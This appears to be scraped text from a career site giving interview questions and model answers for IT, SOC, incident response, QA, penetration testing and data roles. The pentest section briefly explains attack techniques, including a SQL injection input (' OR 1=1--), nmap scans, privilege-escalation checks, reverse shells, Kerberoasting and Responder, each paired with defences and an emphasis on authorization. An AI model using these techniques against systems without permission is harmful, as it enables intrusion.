Reconcile with an independent source, check row counts after each join (watch for fan-out), spot-check samples by hand, compare totals over time and test boundary dates.
[normal] When would you pick a bar chart over a line chart?
Bars compare categories. Lines show change over time. Avoid pie charts with many slices and 3D effects, and always label axes.
[hard] Why might a join increase the row count unexpectedly?

The join key isn't unique on one side, so each match multiplies rows (fan-out). Check key uniqueness, aggregate before joining, or use DISTINCT carefully.
[hard] Explain correlation versus causation with an example.
Two metrics moving together doesn't mean one causes the other. Ice cream sales and sunburns both rise in summer. Establish causation with experiments (A/B tests) or careful controls.
[hard] How does an A/B test work, and what can go wrong?
Randomly assign users to control and variant, pick one primary metric in advance, run for a pre-planned sample size, then test significance. Pitfalls: peeking early, multiple comparisons, uneven groups and novelty effects.
[hard] How would you optimize a slow query?
Read the execution plan, add or fix indexes, filter early, select only needed columns, avoid functions on indexed columns in WHERE, reduce row explosion in joins, and consider pre-aggregated tables.

[normal] A dashboard number doesn't match finance's report.
Compare definitions (time zone, refunds, status filters), reconcile row-level samples, find the first point where they diverge, document the difference, and agree on one definition.
[hard] A manager asks you to "make the numbers look better" for a presentation.
Offer to show the real numbers clearly, with context and a path to improvement. Don't misrepresent data. If pressed, escalate; your credibility is the asset.

When something real happens, you contain it, work out what the attacker did, and help the business recover. Usually the step after SOC Tier 2.
Also called: Incident Responder, DFIR Analyst, CSIRT Analyst, Digital Forensics Examiner, Threat Hunter

Incident response (IR) is the work that happens after an alert becomes an incident. Responders decide how to contain it, collect evidence in a defensible way, reconstruct a timeline, find the entry point, and make sure the attacker is really gone. Digital forensics (DFIR) is the evidence side: disk, memory, logs and network artifacts.
Most responders arrive here from SOC or sysadmin work, because you need to know what "normal" looks like on a system before you can see what is wrong. Entry-level roles exist, often as a SOC Tier 2 or a junior forensics position.

Triage escalated incidents and decide scope and severity
Collect and preserve evidence (memory capture, disk images, log exports) with chain of custody
Analyze artifacts: process trees, persistence, registry, event logs, browser and file system timelines
Coordinate containment and recovery with IT, legal and management
Write the timeline and report, then update playbooks and detections

[easy] Why incident response?
You like the investigation and being useful when it matters. Mention the lab work that gave you a taste of it, and that you understand the calm, documented approach the work demands.
[easy] How do you stay calm during a major incident?
Follow the process, write down every action with time, communicate on a schedule, divide tasks, and avoid guessing. A checklist is what keeps people steady.
[easy] What makes a good incident report?
Short executive summary, a timeline in UTC with evidence references, root cause, impact, actions taken, indicators, and lessons with owners and dates. Readable by both management and technical staff.

[easy] What are the phases of incident response?
NIST: preparation; detection and analysis; containment, eradication and recovery; post-incident activity.
[easy] What is the order of volatility?
Collect most volatile first: CPU registers and cache, RAM, network state and processes, disk, remote logs, archives. RAM first because it disappears on shutdown.
[easy] What is chain of custody?
Documentation of who handled evidence, when, and what was done, so it stays admissible and trustworthy. Combined with hashes to prove it wasn't changed.
[easy] Why hash evidence?
A cryptographic hash (SHA-256) of the original and the copy proves they are identical, and lets you show integrity later.
[normal] Why not just power off a compromised machine?

You lose volatile evidence (processes, network connections, keys in memory) and may trigger tampering. Prefer isolating from the network and capturing memory first, unless there is ongoing destructive damage.
[normal] What artifacts show program execution on Windows?
Prefetch, Amcache, ShimCache, UserAssist, SRUM, event logs (4688 with command line, Sysmon 1), and scheduled tasks and services. Know that each has caveats and combine them.
[normal] What are common persistence mechanisms?
Run keys, scheduled tasks, services, startup folder, WMI event subscriptions, DLL hijacking, cron jobs, systemd units, SSH authorized_keys, and new accounts.
[normal] How do you decide when to contain vs. keep watching?

Weigh the risk of ongoing damage against intelligence value. If data is leaving or ransomware is spreading, contain at once. Otherwise, a short, coordinated observation can reveal scope, but only with management agreement.
[normal] How do you find the initial access?
Work backward from the earliest known malicious activity: phishing emails, exposed services, VPN logs, web server logs, and new accounts. Look for the first anomalous logon or process for the earliest timestamp.
[normal] What is the difference between a threat hunt and an investigation?
A hunt starts with a hypothesis and searches for undetected activity. An investigation starts with a known alert or incident.
[normal] How do you analyze a suspicious process on a live system?

List the process tree and parent, check command line and path, signature, network connections, loaded modules, file hashes against intelligence, and compare to baseline. Capture memory if it's worth preserving.
[hard] What does the Volatility pslist vs psscan difference tell you?
pslist walks the active process list; psscan scans memory for process structures. A process in psscan but not pslist may be hidden or terminated, so investigate it.
[hard] How would you determine whether data was exfiltrated?
Review proxy, firewall, DNS and NetFlow for large or unusual outbound transfers, cloud storage uploads, archives staged on disk, and tool use such as rclone. Establish what data the accessed account could reach.
[hard] Describe how pass-the-hash works and how to respond.

An attacker uses an NTLM hash directly to authenticate without the password. Detect with logon type 3 NTLM from unusual sources and credential dumping indicators. Respond by resetting credentials (including krbtgt if domain compromise), limiting admin logons, and enabling credential guard.
[hard] What goes into a containment plan for a domain compromise?
Isolate affected systems, reset privileged and service credentials in order (krbtgt twice), remove persistence, block attacker infrastructure, patch the entry point, rebuild critical hosts, and monitor closely. Plan the communication with leadership.

[normal] A web server shows an unfamiliar file in its upload directory.
Isolate and preserve first. Capture the file's hash and metadata, review web logs for the upload and later requests to it, check for a web shell, review process creation from the web service, and work out the vulnerability used.
[hard] Management wants the server back online now, but you haven't finished the investigation.
Explain the risk with specifics, capture what evidence is needed quickly (image or memory), offer a rebuilt clean system as a faster safe path, and let leadership decide with the risk documented.

The questions every interviewer asks, whatever the job. Learn the shape of a good answer, then fill it with your own real stories.
Every path below has its own role-specific questions too. Start here, then go to the path you're aiming at.
cat METHOD

Answers are built from your own material. Model answers below show the shape and the level of detail. Replace the examples with things you actually did. Interviewers can tell when a story is borrowed, and a follow-up question ("what would you do differently?") exposes it fast.
STAR for behavioral questions. Situation (one sentence), Task (what was yours to do), Action (what *you* did, with specifics), Result (a number or an outcome, then what you learned). Aim for about 90 seconds. Most weak answers spend 80 percent on the situation and skip the result.
For technical questions: answer in layers. Give the one-sentence definition first, then how it works, then a real example or a trade-off. If you don't know, say what you do know, then how you would find out. "I haven't used that, but here is how I would approach it" beats a guess stated as fact.
Prepare four stories and reuse them across questions: something you built, something that broke and how you fixed it, a time you learned something fast, and a time you disagreed or got feedback. Lab projects count when they are real work you can walk through in detail.
grep -i 'tell me' questions

[easy] Tell me about yourself.
Present, past, future in about a minute. Present: "I'm finishing a cybersecurity degree and I run a homelab where I practice detection and administration." Past: one or two pieces of evidence that match this job (a project, an internship, a lab). Future: why this role is the next step. Don't recite the resume line by line.
[easy] Why do you want this job?
Connect the role to something specific you have already done. "I enjoy the triage side of security, and I've been practicing it with Security Onion alerts at home" is stronger than "I'm passionate about cybersecurity." Mention one thing about the team or company you actually looked up.
[easy] Why should we hire you over other candidates?

You don't know the other candidates, so don't compare. Name two or three strengths that match the posting, each with proof: what you built, what you measured, what you fixed. Close with willingness to learn the stack they use.
[easy] Walk me through your resume.
Go in reverse order of relevance, not chronology: start with the experience closest to this job. For each item say what the problem was, what you did, and the outcome. Skip anything you couldn't answer follow-up questions about.
[easy] What are your strengths?
Pick one or two that the job needs and back each with an example. "I document what I do, so my homelab notes let me rebuild a VM from scratch" is concrete. Avoid generic words like "hard-working."
[easy] What is your biggest weakness?

Give a real, fixable weakness and what you are doing about it. For example: "I used to dive into a problem without writing down what I'd already tried, so I repeated steps. Now I keep a running log in each ticket or lab." Don't pick a fake weakness like perfectionism.
[easy] Where do you see yourself in five years?
Honest and aimed at growth in the same field: deeper technical skill, maybe a specialty, maybe mentoring newer people. Don't say you want the interviewer's job, and don't say you'll have left the field.
[easy] What are your salary expectations?
Research the range for the role and location first (levels.fyi, Glassdoor, the posting itself, the BLS occupational handbook). Give a range anchored on the market, say you are flexible depending on the whole package, and ask what range they budgeted if you can.
[easy] Do you have any questions for us?

Always yes. Ask about the first 90 days, what a good first year looks like, how the team handles on-call or escalation, how they train new people, and what the hardest part of the job is. Don't ask about salary or vacation in a first screen.
[easy] Are you willing to work shifts, weekends or on-call?
Be honest. SOC and help desk roles often run 24/7 rotations, and entry-level people usually get the odd hours first. If you are fine with it, say so plainly; if there are limits, state them early and politely.
grep -i 'time when' questions

[normal] Tell me about a time something you built or configured broke.
Pick a real failure with a clear cause. Example shape: "I changed a firewall rule on my pfSense box and locked myself out of the management interface. I got back in through the Proxmox console, restored the saved config, and now I snapshot the VM and export the config before every change." Own the mistake, show the fix, show the process change.
[normal] Describe a time you had to learn something quickly.
Name the deadline or need, how you learned (docs, labs, asking someone), and the result. A good example is picking up a tool for a project and then using it unprompted afterward.
[normal] Tell me about a time you disagreed with someone.
Focus on how you handled it: you asked questions, found the actual difference, used data or a test to decide, and kept the relationship. Never trash a former coworker or teammate.

[normal] Tell me about a difficult user or customer.
Show empathy and process: you listened, restated the problem, found the actual cause (often not the one reported), explained it without jargon, and followed up. Help desk stories fit here.
[normal] Tell me about a time you made a mistake at work.
Same structure as the broken-build story but about people or process: what happened, how fast you disclosed it, how you fixed it, what you changed. Interviewers hire people who report mistakes early.
[normal] How do you prioritize when everything is urgent?
Describe a method: impact and number of people affected first, then deadline, then effort. Say you communicate the order to stakeholders rather than silently dropping things. In IT and security, "service down" and "active compromise" outrank everything.
[normal] Tell me about a project you're proud of.

Walk through the goal, the design choices and why, one problem you hit, and the outcome. Have a diagram or screenshot ready. Be able to go three levels deeper on any component you mention.
[normal] How do you stay current in the field?
Name specific sources, not "I read a lot." For example: CISA and vendor advisories, a couple of podcasts or blogs, TryHackMe or HackTheBox rooms, and a homelab where you try what you read. Mention the last thing you learned.
[normal] How do you handle working under pressure or during an incident?
Stay methodical: confirm scope, communicate status on a schedule, follow the runbook, write things down as you go. Admit what you don't know and escalate early. Calm and clear updates matter more than speed.
[normal] Tell me about working on a team.

Pick a group project or shared lab. Say what your piece was, how you coordinated (Git, tickets, check-ins), and one thing the team did better because of how you worked.
[normal] What do you do when you don't know the answer?
Narrow the problem, search the docs and logs, try a small test, then ask with specifics ("here is what I checked and what I saw") after a reasonable time, not after hours stuck and not after thirty seconds.
[normal] Tell me about a time you explained something technical to a non-technical person.
Use an analogy, skip acronyms, check understanding, and give them the one action they need to take. Help desk, tutoring and presenting a project all work as examples.
grep -i 'integrity' questions

[normal] You notice a coworker doing something that looks against policy. What do you do?
Verify what you actually saw, avoid accusing, and report through the proper channel (manager, security team, or ethics line). Don't confront them in public and don't investigate with access you don't have.
[normal] You find sensitive data you shouldn't have access to. What do you do?
Stop, don't open or copy it further, record where it was (not the contents), and report it to your manager or the data owner right away. Misconfigured access is a finding, not a perk.
[normal] A manager asks you to skip a security step to hit a deadline.
Explain the specific risk in business terms, offer a faster safe option, and if the answer is still no, get the decision in writing and escalate according to policy. Don't quietly comply and don't quietly refuse.
[normal] Is it ever okay to test a system you don't own?
No, not without written authorization. Testing needs a defined scope, rules of engagement and sign-off. CTF platforms and your own lab are the places to practice.

Give an honest date. If you are still in school or serving notice, say when you finish and whether part-time or early work is possible.
[easy] Anything else you'd like us to know?
Use it for one point you haven't yet made, such as a project they didn't ask about, then end with interest in the role. Keep it under 30 seconds.

The front line of IT. You fix people's problems, learn how an entire company's technology fits together, and build the base that every other IT and security job stands on.
Also called: Help Desk Technician, IT Support Specialist, Desktop Support, Service Desk Analyst, Technical Support Engineer

Help desk is the most common entry point into IT, and one of the best. In a single week you touch accounts, passwords, printers, laptops, networking, software installs and security incidents (the phishing email someone clicked). You work through a ticketing system, follow procedures, and escalate what you can't solve to Tier 2 or to specialists.
What employers look for: patience, clear writing, a methodical troubleshooting habit, and enough breadth to be useful on day one. Certifications help most at this level because they prove the breadth before you have a job history.

[easy] Why do you want to work in IT support?
Say what you like about solving problems for people and mention a time you did it, such as helping a friend or running a lab. Tie it to a longer path: "I want to understand how the whole environment fits together, and support is the best place to learn that."
[easy] What does a good support interaction look like?
Greet, listen without interrupting, confirm the problem in your own words, set expectations on time, fix or escalate with a clean handoff, confirm the user is happy, and document everything.
[easy] How do you deal with an angry or frustrated user?
Stay calm, acknowledge the impact ("that sounds disruptive"), stop defending, restate the issue, give them a concrete next step and time, and follow through. The frustration is almost never about you.
[easy] How do you handle a ticket you can't solve?
Show what you tried, search the knowledge base and logs, ask a peer, then escalate with the evidence. Tell the user honestly what is happening and when they'll hear back.

[easy] A user says "my computer is slow." What do you do?
Ask when it started and whether anything changed. Check Task Manager or Activity Monitor for CPU, memory, disk and network, check free disk space, startup programs, pending updates and malware scans, and test whether it is one app or everything. Change one thing at a time and re-test.
[easy] What is the difference between a hub, switch and router?
A hub repeats traffic to every port, a switch forwards frames to the right port by MAC address, and a router moves packets between different networks by IP address.
[easy] What does DHCP do, and what happens if it fails?
It hands out IP addresses, masks, gateway and DNS automatically. If it fails, clients may self-assign a 169.254.x.x (APIPA) address and can't reach anything off their segment. Check the DHCP server, the scope, and the cable or Wi-Fi.
[easy] What is DNS?

The system that translates names to IP addresses. If you can ping an IP but not a name, DNS is the likely problem. Test with nslookup and flush the cache with ipconfig /flushdns.
[easy] A user is locked out of their account. How do you proceed?
Verify identity using the company procedure first. Then check the lockout in Active Directory (Unlock-ADAccount), find the source of repeated bad passwords (phone with old password, mapped drive), and reset only if needed.
[normal] A user can't print. Walk me through it.
Check if it's one user or everyone, whether the printer is on and has no error, whether it's the right printer and not paused, the print queue and spooler service, network connectivity to the printer's IP, and drivers. Test with another user and another document.
[normal] A PC can't reach the internet but others can.

Check the link light and Wi-Fi, run ipconfig /all to see the address, gateway and DNS, ping the gateway, then a public IP (8.8.8.8), then a name. Where the chain breaks tells you the layer: local link, routing, or DNS.
[normal] What is the difference between a domain account and a local account?
A domain account is stored in Active Directory and works on any domain-joined machine with central policy and password control. A local account exists only on one machine.
[normal] What is Group Policy?
A way to push settings to users and computers in AD by OU: password rules, mapped drives, software restrictions, firewall settings. Use gpresult /r to see what applied and gpupdate /force to refresh.
[normal] What are the steps of the CompTIA troubleshooting methodology?

Identify the problem, establish a theory of probable cause, test the theory, establish a plan and implement it, verify full functionality and add preventive measures, then document findings. Be ready to use it on an example.
[normal] What is the difference between RAID 0, 1 and 5?
RAID 0 stripes data for speed and has no redundancy. RAID 1 mirrors two drives and survives one failure. RAID 5 stripes with parity across at least three drives and survives one failure. RAID is not a backup.
[normal] How do you secure a new laptop before giving it to a user?
Full disk encryption (BitLocker), current updates, endpoint protection, a standard (non-admin) user account, strong password or MFA, firewall on, and required software installed through the management tool. Record the asset tag and recovery key.
[hard] Explain what happens when you type a URL into a browser and press enter.

DNS resolves the name (cache, resolver, root, TLD, authoritative). The client opens a TCP connection to the IP (three-way handshake), negotiates TLS for HTTPS, sends an HTTP request, and renders the response. Mention ARP and the default gateway for the local step if asked to go deeper.
[hard] A user's mailbox is full and they're missing important mail. What do you do?
Confirm the quota and what's consuming it, help them archive or clean up, and consider raising the quota or enabling online archive with approval. Check for mail rules or a loop causing floods, and confirm new mail is arriving after the fix.
[hard] How would you offboard an employee?

Disable the account (don't delete right away), reset the password, remove from groups and revoke VPN and MFA tokens, convert or forward mailbox per policy, collect hardware, wipe or reimage devices, transfer files to the manager, and record each step in the ticket.
[hard] How do you tell if a suspicious email is phishing, and what do you do?
Check the sender domain and reply-to, links by hovering, urgency or unusual requests, and attachments. Don't click. Report it through the security channel, and if someone clicked, isolate the machine and reset credentials. Mention header analysis as a deeper step.

[normal] Three users report they can't open the shared drive, five minutes apart.
Likely not a user problem. Confirm the pattern, check whether the file server and its network path are up, check recent changes and DNS, tell the people reporting that it's being worked, and raise it as an incident rather than three tickets.
[hard] Your manager asks you to give a user admin rights "just for today" without a ticket.
Explain the risk politely, ask for a ticket or an approval record so there is a paper trail, offer a safer alternative such as a one-time elevation or installing the software for them, and don't hand out admin quietly.

You are paid, with permission, to break into systems and report how. It is competitive and rarely a first job, but the path is clear and you can build a credible portfolio on your own.
Also called: Penetration Tester, Security Consultant, Red Team Operator, Vulnerability Assessor, Application Security Tester

Penetration testers simulate attackers under a written scope and rules of engagement. A typical test: recon, scanning, exploitation, post-exploitation, and then a clear report with evidence and fixes. The report is the product. Plenty of testers say the writing is half the job.
Entry-level pentest roles are scarce and often require previous IT or security experience. A common route: help desk or sysadmin, then SOC or vulnerability management, with CTFs and certifications along the way.

Write findings with severity, evidence, impact and remediation steps
Debrief the client and retest fixes

[easy] Why penetration testing?
You like understanding how things break so they can be fixed. Give a lab example where you found and then fixed an issue. Emphasize authorization, scope and reporting, not just the thrill of exploitation.
[easy] How do you stay ethical?
Written authorization, scope and rules of engagement, minimal impact, protecting any data you see, and responsible disclosure. Never test what you don't have permission to test.
[easy] How do you explain a finding to a non-technical manager?
State the business impact first ("an attacker could read customer records"), then evidence in a sentence, then the fix and priority. Keep jargon in the technical appendix.

[easy] What are the phases of a penetration test?
Planning and scoping, reconnaissance, scanning and enumeration, exploitation, post-exploitation, reporting, and retest. Mention rules of engagement before any testing.
[easy] What is the difference between a vulnerability scan and a penetration test?
A scan finds known weaknesses automatically. A pentest has a human validate, chain and exploit issues to show real impact, and reports with context.
[easy] What does an Nmap SYN scan do?
nmap -sS sends SYN packets and watches for SYN/ACK (open) or RST (closed) without completing the handshake. Needs privileges. Add -sV for versions, -p- for all ports.
[easy] What is the OWASP Top 10?
A regularly updated list of the most critical web application risks, such as broken access control, injection, cryptographic failures and security misconfiguration.

[easy] What is the difference between symmetric and asymmetric encryption?
Symmetric uses one shared key (AES), is fast. Asymmetric uses a public/private key pair (RSA, ECC), slower, used for key exchange and signatures. TLS uses both.
[normal] Explain SQL injection and how to prevent it.
Untrusted input changes the structure of a query, for example ' OR 1=1--. Prevent with parameterized queries or prepared statements, least-privilege database accounts, and input validation as a second layer. Escaping alone is fragile.
[normal] What is cross-site scripting (XSS)?
Injecting script that runs in another user's browser. Reflected, stored and DOM types. Prevent with context-aware output encoding, Content-Security-Policy and HttpOnly cookies.
[normal] What is CSRF and how is it mitigated?

A site tricks a logged-in user's browser into sending an unwanted request. Mitigate with anti-CSRF tokens, SameSite cookies and checking Origin.
[normal] What is privilege escalation on Linux? Give ways to look for it.
Gaining higher privileges than you started with. Check sudo -l, SUID binaries, writable cron jobs and scripts, kernel version, weak file permissions, and credentials in files. Tools like LinPEAS help, but understand the output.
[normal] What is the difference between a bind shell and a reverse shell?
A bind shell listens on the target and you connect to it. A reverse shell connects out from the target to you, which usually passes firewalls better.
[normal] How does password hashing work, and why salt?

A one-way function stores a digest instead of the password. A salt is a unique random value added before hashing so identical passwords hash differently and rainbow tables fail. Use slow algorithms such as bcrypt, scrypt or Argon2.
[normal] What is an SSRF vulnerability?
The server is tricked into making requests to internal or arbitrary URLs. It can reach cloud metadata endpoints and internal services. Defend with allow-lists, network segmentation and blocking metadata access.
[normal] What does nmap -sV -sC -p- target do?
Scans all 65,535 TCP ports, detects service versions and runs the default NSE scripts.
[hard] Explain Kerberoasting and AS-REP roasting.

Kerberoasting: any domain user requests service tickets for accounts with SPNs, then cracks the ticket offline. AS-REP roasting: accounts without Kerberos pre-authentication let you request data encrypted with the user's key and crack it offline. Both are fixed with strong passwords and cleaning up configuration.
[hard] What is a buffer overflow and what mitigations exist?
Writing past a buffer's bounds overwrites adjacent memory such as a return address. Mitigations: stack canaries, ASLR, non-executable stacks (DEP/NX), and safer languages. Bypasses include ROP and information leaks.
[hard] How would you approach an internal network test with no credentials?
Network discovery, identify services, check for anonymous or null access (SMB, LDAP), poison name resolution with Responder where authorized, crack captured hashes, relay where permitted, then enumerate AD with a foothold account.

[hard] How do you rate severity for a finding?
Use CVSS as a starting point, then adjust for exploitability, business impact, exposure and compensating controls. Be ready to justify the rating to the client.

[normal] During a test you find real customer data in a database you can access.
Stop pulling data, record minimal proof (such as a count and a redacted sample), report to the client contact immediately per the rules of engagement, and don't copy or keep the data.
[hard] You break a production service during testing.
Stop, tell the client contact right away, explain what you did and how to restore, help with recovery, and document the incident. Early honesty protects the relationship.

You find the problems before users do, and increasingly you write the automation that does it. A realistic first job in software and a bridge to development or security testing.
Also called: QA Analyst, QA Engineer, Software Tester, Test Automation Engineer, SDET

QA verifies that software does what it should. Manual testers explore the product, write test cases and report bugs precisely. Automation engineers write code (Selenium, Playwright, Cypress, API tests) that runs those checks on every change. Strong testers think like users and like attackers, and write bug reports a developer can act on without a conversation.
QA is a good first job for people with a degree but little professional coding history, and it moves naturally toward development, test engineering or application security.

Automate regression tests and keep them reliable

Verify fixes and retest before release

[easy] Why QA?
Say you enjoy finding edge cases and care about quality for users, and that it builds both product and technical knowledge. Be ready to describe a bug you found.
[easy] Do you want to stay in QA or move to development?
Either answer is fine if honest. A good one: "I want to grow in test automation, and I'm open to development roles where I can use that mindset." Show curiosity for both.
[easy] How do you work with developers who disagree that something is a bug?
Reproduce it, show the steps and evidence, reference the requirement or user impact, stay neutral, and let the product owner decide when requirements are unclear. It's about the product, not winning.

[easy] What is the difference between verification and validation?
Verification: are we building the product right (meets spec). Validation: are we building the right product (meets user needs).
[easy] What is the difference between severity and priority?
Severity is the technical impact of the bug. Priority is how soon it should be fixed. A typo on the homepage can be low severity but high priority.
[easy] What goes into a good bug report?
Title, environment (build, OS, browser), steps to reproduce, expected and actual results, evidence (screenshot, logs), and severity. Reproducible and minimal.
[easy] What are the levels of testing?
Unit, integration, system and acceptance testing, from smallest to whole product. Know who usually owns each.
[normal] What is regression testing and why automate it?

Re-testing existing features after changes to catch breakage. It's repetitive and runs often, which makes it the best candidate for automation.
[normal] Which tests should you not automate?
Exploratory tests, one-off checks, features that change often, and anything where setup costs more than the manual run. Prioritize stable, high-value, high-frequency paths.
[normal] What is the test pyramid?
Many fast unit tests at the base, fewer integration/API tests in the middle, and few slow UI tests at the top. Inverting it gives slow, flaky suites.
[normal] Explain boundary value analysis and equivalence partitioning.
Split inputs into classes expected to behave the same (equivalence), then test the edges of each class (boundaries). For ages 18-65: test 17, 18, 65, 66.
[normal] How do you handle flaky tests?

Identify the cause (timing, shared data, environment), replace sleeps with explicit waits, isolate test data, retry only as a diagnostic, and quarantine and fix. Never ignore flakiness, since it destroys trust in the suite.
[normal] What is the difference between black-box and white-box testing?
Black-box tests behavior without knowing the code. White-box uses knowledge of the code structure, such as branch coverage.
[normal] How would you test a login page?
Valid login, wrong password, empty fields, SQL/script characters, lockout after attempts, password reset, session expiry, MFA, accessibility, error messages that don't reveal whether the user exists, and different browsers and devices.
[normal] How do you test an API?

Check status codes, response body and schema, headers, auth and permissions, error cases and bad input, rate limits, idempotency, and performance. Use Postman or a code-based suite, and run it in CI.
[hard] How would you decide what to test when you don't have enough time?
Risk-based testing: weigh likelihood of failure and business impact, cover the critical paths and recent changes first, and communicate what was not tested.
[hard] Design the test strategy for a new payments feature.
Requirements review, unit and integration tests for calculations, API contract tests, end-to-end happy path and failures (declines, timeouts, duplicates), security (authorization, PCI concerns), performance, monitoring in production, and a rollback plan.
[hard] What is a good metric for QA, and what is a bad one?

Good: escaped defects, time to detect, test reliability, cycle time. Bad: raw number of bugs found or test cases written, which can be gamed and say nothing about quality.
[hard] How does testing fit into CI/CD?
Fast unit tests and linting on every commit, integration and API tests on merge, a small smoke UI suite before deployment, and broader regression on a schedule. Failures block the pipeline and reports are visible.

[normal] A release is tomorrow and you find a serious bug today.
Report it immediately with evidence and impact, help the team assess options (fix, delay, disable the feature), retest the fix, and leave the decision to the product owner with the risks documented.
[hard] You're given a feature with no requirements.
Ask for acceptance criteria, talk to the developer and product owner, explore the feature, write down the assumptions, and get them confirmed. Document what you tested.

You watch the alerts, decide which are real, and stop incidents early. The most common way into security, and a good fit for people who like investigation.
Also called: SOC Analyst, Security Analyst, Cyber Defense Analyst, Security Operations Analyst, Threat Monitoring Analyst

A Security Operations Center (SOC) monitors an organization's systems around the clock. Tools such as a SIEM (Splunk, Elastic, Microsoft Sentinel, Security Onion) collect logs and raise alerts. Analysts triage each one: is it a false positive, suspicious, or a confirmed incident? Real incidents are escalated or handled using a runbook.
Tier 1 does triage and escalation. Tier 2 investigates deeper, hunts, and tunes detections. Shift work and ticket volume are common. The job rewards curiosity, written clarity and not being rattled by noise.

Work the alert queue, look up the user, host, IP and process involved
Pivot in the SIEM: what else did this host or account do around that time?
Check indicators against threat intelligence and decide: false positive, benign true positive, or incident
Write a clear ticket: what happened, what evidence, what action, who was told
Tune noisy rules with the detection team and hand off cleanly at shift change

Tier 1 analyst alert triage, ticketing, escalation, following playbooks
Tier 2 analyst / incident handler deeper investigation, host and network analysis, containment
Tier 3 / threat hunter / detection engineer hunting, writing detections, malware triage
Specializations incident response, threat intelligence, security engineering, forensics

CompTIA Security+ the baseline most entry-level SOC postings list
